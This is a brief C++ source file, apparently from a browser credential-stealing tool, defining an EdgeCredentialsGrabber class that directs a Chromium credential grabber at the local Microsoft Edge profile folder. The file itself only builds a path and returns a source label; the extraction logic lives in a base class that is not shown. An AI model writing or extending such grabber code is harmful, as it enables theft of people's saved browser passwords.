#include "EdgeCredentialsGrabber.hpp"

#include "Utils/Environment.hpp"

EdgeCredentialsGrabber::EdgeCredentialsGrabber() :
	ChromiumCredentialsGrabber(get_local_edge_path())
{
}

std::filesystem::path EdgeCredentialsGrabber::get_local_edge_path()
{
	return Environment::expand_variables(EDGE_ROOT_FOLDER);
}

std::wstring EdgeCredentialsGrabber::source() const
{
	return L"Edge";
}
